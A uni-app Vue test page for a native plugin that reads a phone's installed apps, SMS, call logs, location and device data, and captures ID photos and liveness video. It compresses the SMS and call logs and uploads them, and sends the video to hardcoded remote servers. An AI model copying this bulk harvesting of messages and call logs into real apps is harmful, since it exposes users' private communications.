  <template>
      <view>
          <view class="container">
              <button @click="test()">test</button>
              <button @click="login()">login</button>
              <button type="primary" @click="getInstall">获取安装列表数据</button>
              <button type="primary" @click="getSMSList">获取短信数据</button>
              <button type="primary" @click="getLocation">获取位置数据</button>
              <button type="primary" @click="getCallLogList">获取通话记录数据</button>
              <button type="primary" @click="getDeviceInfo">获取设备信息数据</button>
              <button type="primary" @click="getGoCamera">拍身份证</button>
              <button type="primary" @click="getGoCameraVideo">视频录制</button>
              <button type="primary" @click="openAlbum(false)">单选图片</button>
              <button type="primary" @click="openAlbum(true)">多选图片</button>
              <button type="primary" @click="initAf()">初始化AF</button>
          </view>
      </view>
  </template>

  <script>
      import {
          dataURLtoBlob,
          blobToFile
      } from 'base64-file'

      import {
          pathToBase64,
          getLocalFilePath,
          base64ToPath
      } from '@/node_modules/image-tools/index.js'
      import pako from 'pako';
      import {
          login,
          upload,
          test,
          beforeLive
      } from '@/api/data.js'
      //  #ifdef APP-PLUS
      const wtModule = uni.requireNativePlugin('WTUniPlugin-WTModule');
      // #endif

      export default {
          data() {
              return {
                  href: 'https://uniapp.dcloud.io/component/README?id=uniui',
                  url: 'http://120.46.139.43:9527/gPjkvSR/wTcEL/xqtQju',
                  text: '',
                  token: '',
                  valueChangeSign: '',
                  weburl: '/hybrid/html/face.html'
              }
          },
          onLoad() {},
          onShow() {},
          methods: {
              test() {
                  const googlePlay = "com.android.vending"
                  // try {
                  //     let uri = Uri.parse("market://details?id=" + 'com.qiyi.video')
                  //     let intent = Intent(Intent.ACTION_VIEW, uri)
                  //     intent.setPackage(googlePlay)
                  //     intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                  //     context.startActivity(intent)
                  // } catch (e) {
                  //     console.log(e)
                  // }
                  if (plus.os.name == "Android") {  
                      var Uri = plus.android.importClass("android.net.Uri");  
                      var Intent = plus.android.importClass('android.content.Intent');  
                      var main = plus.android.runtimeMainActivity();  
                      var uri = Uri.parse("market://details?id=" + 'com.qiyi.video');  
                      var intent = new Intent(Intent.ACTION_VIEW, uri);  
                      // 选择进入商店  
                      intent.setPackage(googlePlay);  
                      intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK;  
                      // 没有该商店应用  
                      if (intent.resolveActivity(main.getPackageManager()) !== null) {  
                          main.startActivity(intent);  
                      } else {  
                          // 跳转浏览器  
                          let uri = Uri.parse("https://play.google.com/store/apps/details?id=" + 包名);  
                          let intent = new Intent(Intent.ACTION_VIEW, uri);  
                          intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK;  
                          intent.setPackage('com.android.browser');  
                          main.startActivity(intent);  
                      }  
                  } else {  
                      plus.runtime.openURL('itms-apps://itunes.apple.com/cn/app/id{appid}?mt=8');  
                  }  
                  // uni.navigateTo({
                  //     url:'/pages/web/index'
                  // })
                  // var main = plus.android.runtimeMainActivity();
                  // var pkName = main.getPackageName();
                  // console.log(pkName)
                  // if (plus.os.name == "Android") {
                  //     let appurl = "market://details?id=com.android.vending"; //这个是通用应用市场，如果想指定某个应用商店，需要单独查这个应用商店的包名或scheme及参数
                  //     plus.runtime.openURL(appurl);
                  // }

              },
              onPostMessage(e) {
                  let method = e.detail.data[0].method
                  let value = e.detail.data[0].value
                  console.log(value)
              },

              login() {
                  login().then(res => {
                      console.log(res.data)
                  })
                  // beforeLive().then(res => {
                  //     console.log(res)
                  // })
              },
              getInstall() { // 获取安装列表
                  wtModule.getAppList((ret) => {
                      console.log(ret)
                      upload({
                          jsonPayload: ret,
                          uploadType: '1'
                      }).then(res => {
                          console.log(res)
                      })
                  })
              },
              getSMSList() { // 短信
                  wtModule.getSMSList((ret) => {
                      let data = pako.gzip(ret)
                      data = btoa(String.fromCharCode(...new Uint8Array(data)));
                      console.log(data)
                      upload({
                          jsonPayload: data,
                          uploadType: '4'
                      }).then(res => {
                          console.log(res)
                      })
                  })
              },
              getLocation() { // 获取位置
                  wtModule.getLocation((ret) => {
                      console.log(ret)
                  })
              },
              getCallLogList() { // 获取通话记录
                  wtModule.getCallLog((ret) => {
                      console.log(ret)
                      let data = pako.gzip(ret)
                      data = btoa(String.fromCharCode(...new Uint8Array(data)));
                      upload({
                          jsonPayload: data,
                          uploadType: '7'
                      }).then(res => {
                          console.log(res)
                      })
                  })
              },
              getDeviceInfo() {
                  wtModule.getMobileInfo((ret) => {
                      console.log(JSON.parse(ret))
                      // upload({
                      //     jsonPayload: ret,
                      //     uploadType: '6'
                      // }).then(res => {
                      //     console.log(res)
                      // })
                  })
              },
              getGoCamera() { // 拍身份证
                  wtModule.takePhoto({
                      type: 1
                  }, (ret) => {
                      console.log(ret)
                  })
              },
              getGoCameraVideo() { // 视频录制
                  let _this = this
                  wtModule.takePhoto({
                      type: 2,
                      index: 2
                  }, (ret) => {
                      ret = JSON.parse(ret)
                      console.log(ret)
                      wtModule.uploadVideoAndImage({
                          data: {
                              'url': 'http://mx-app-tgwb1.daikuns.com:8080/SJRdDQj/WlkEdp/mvRvmieD/xgnKTFRJWE',
                              'uuid': 'd8c79056b21646418caf3f398be994ef',
                              'token': 'b748400f16cc4a7e93c31c00dfc3eb5f',
                              'ufcs': ret.video,
                              'imcs': ret.image,
                              'liveSlinger': 'brainf',
                              'slinger': 'tongdun',
                              'actionCode': '1',
                              'deviceOS': 'P1001',
                              'i18n': 'zh_CN',
                              'reqSource': 'Android',
                              'phoneName': uni.getSystemInfoSync().brand,
                              'appVersion': '1.0.0',
                              'androidversion': '14.1',
                              'webVersion': 'H5_A',
                              'deviceID': uni.getSystemInfoSync().deviceId,
                          },
                          header: {
                              'content-type': 'multipart/form-data',
                              'ownerShip': 'tgwb1',
                              'encrypted': 0,
                              'encryptType': 0,
                              'disturbedUrl': 0,
                              'disturbedPar': 1
                          }
                      }, (res) => {
                          console.log(res)
                          res = JSON.parse(res)
                          console.log(res)
                      })
                  })
              },
              base64ToArrayBuffer(base64) {
                  const binaryString = window.atob(base64);
                  const len = binaryString.length;
                  const bytes = new Uint8Array(len);
                  for (let i = 0; i < len; i++) {
                      bytes[i] = binaryString.charCodeAt(i);
                  }
                  return bytes.buffer; // 返回 ArrayBuffer
              },
              openAlbum(isMultiple) { // 图片选择
                  let _this = this
                  wtModule.takePhoto({
                      index: 2,
                      isMultiple: isMultiple
                  }, (ret) => {
                      // console.log(ret)
                      let data = 'data:image/video;base64,' + JSON.parse(ret)[0].replace(/\r\n/g, "")
                      _this.test(data)
                      // base64ToPath(data)
                      //     .then(res => {

                      //         console.log(res)
                      //         // 1. 使用 plus.io.resolveLocalFileSystemURL 来获取文件对象
                      //         plus.io.resolveLocalFileSystemURL(res, function(entry) {
                      //             entry.file(function(file) {
                      //                 console.log(file);
                      //                 // 2. 使用 FileReader 读取文件
                      //                 const reader = new plus.io.FileReader();
                      //                 reader.onloadend = function(event) {
                      //                     // 3. 将读取的结果转换为 Blob 对象
                      //                     const blob = new Blob([reader.result], {
                      //                         type: file.type
                      //                     });
                      //                     console.log(blob)
                      //                     // 4. 创建 File 对象
                      //                     const finalFile = new File([blob], fileName ||
                      //                         file.name, {
                      //                             type: file.type,
                      //                             lastModified: file
                      //                                 .lastModifiedDate
                      //                         });

                      //                     // 5. 输出或使用 File 对象
                      //                     console.log(finalFile);

                      //                     // 这里你可以把 finalFile 对象上传到服务器或者做其他处理
                      //                 };

                      //                 // 读取文件内容为 ArrayBuffer
                      //                 reader.readAsArrayBuffer(file);
                      //             }, function(error) {
                      //                 console.error('File entry error: ' + error.message);
                      //             });
                      //         }, function(error) {
                      //             console.error('Resolve file system URL error: ' + error.message);
                      //         });
                      //     })
                      //     .catch(error => {
                      //         console.log(error)
                      //     })


                  })
              },
              initAf() { // 初始化AF
                  wtModule.initAf({
                      key: '*************',
                      uuid: '*********'
                  }, (ret) => {
                      console.log(ret)
                  })
              },
          }
      }
  </script>
  <script module="web" lang="renderjs">
      export default {
          methods: {
              base64ToFile(base64String, fileName, mimeType) {
                  // 去掉开头的`data:`和`base64,`标识符
                  const byteString = atob(base64String.split(',')[1]);

                  // 创建一个 Uint8Array 数组来保存解码后的数据
                  const arrayBuffer = new ArrayBuffer(byteString.length);
                  const uint8Array = new Uint8Array(arrayBuffer);

                  // 将字符串中的每个字符的 UTF-16 编码值填充到 Uint8Array 中
                  for (let i = 0; i < byteString.length; i++) {
                      uint8Array[i] = byteString.charCodeAt(i);
                  }

                  // 使用 Blob 创建一个文件对象
                  const file = new File([uint8Array], fileName, {
                      type: mimeType
                  });
                  return file;
              },
              valueChange(newVal, oldVal, ownerInstance, instance) {
                  console.log("我是视图层，我被逻辑层调用了...");
                  if (!newVal) {
                      return
                  }
                  const base64String = newVal;
                  const fileName = "demo.mp4";
                  const mimeType = "text/plain";
                  const file = this.base64ToFile(base64String, fileName, mimeType);

                  // 输出 File 对象信息
                  // var blob = this.dataURLtoBlob(newVal);
                  // var file = this.blobToFile(blob, 'test');
                  console.log(file);
                  this.$ownerInstance.callMethod('methodForRenderJs', file);
              },
              // 逻辑层向视图层传值
              postMessage(event, ownerInstance) {
                  this.$ownerInstance.callMethod('login', {
                      data: '需要发送的数据'
                  })
              },
              onClick(event, ownerInstance) {
                  // 调用 service 层的方法
                  ownerInstance.callMethod('onViewClick', {
                      test: 'test'
                  })
              }
          }
      }
  </script>
  <style>
      .container {
          padding: 20px;
          font-size: 14px;
          line-height: 24px;
      }

      .web-view {
          width: 750rpx;
          height: 1200rpx;
      }
  </style>